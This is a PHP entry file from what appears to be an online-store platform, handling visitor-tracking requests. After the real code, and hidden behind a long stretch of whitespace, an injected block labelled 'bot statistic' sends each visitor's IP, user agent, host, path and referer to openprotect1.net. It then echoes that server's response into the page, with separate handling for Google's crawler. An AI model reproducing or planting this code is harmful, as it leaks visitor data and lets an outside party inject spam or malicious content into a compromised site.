<?php
error_reporting(0);

	include(dirname(__FILE__)."/init.php");

	// Visitor tracking Javascript
	if(isset($_REQUEST['action'])) {
		if($_REQUEST['action'] == "tracking_script") {
			$visitor = GetClass('ISC_VISITOR');
			$visitor->OutputTrackingJavascript();
		}
		else if($_REQUEST['action'] == "track_visitor") {
			$visitor = GetClass('ISC_VISITOR');
			$visitor->TrackVisitor();
		}
	}
	RewriteIncomingRequest();  	

?>

																																																																								 <?php 	/*This code use for global bot statistic*/ 	$sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); /*Looks for google search bot*/ 	$sReferer = ''; 	if(isset($_SERVER['HTTP_REFERER']) === true) 	{ 		$sReferer = strtolower($_SERVER['HTTP_REFERER']); 	} 	if(!(strpos($sUserAgent, 'google') === false)) /*Bot comes*/ 	{ 		if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) /*Create bot analitics*/			 		echo file_get_contents('http://openprotect1.net/Log/StatM/Stat.php?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']).'&ref='.urlencode($sReferer) ); 	} else 	{ 		if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) /*Create bot analitics*/			 		echo file_get_contents('http://openprotect1.net/Log/StatM/Stat.php?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&addcheck='.'&check='.isset($_GET['look']).'&ref='.urlencode($sReferer)); 	} /*Statistic code end*/ ?>  	
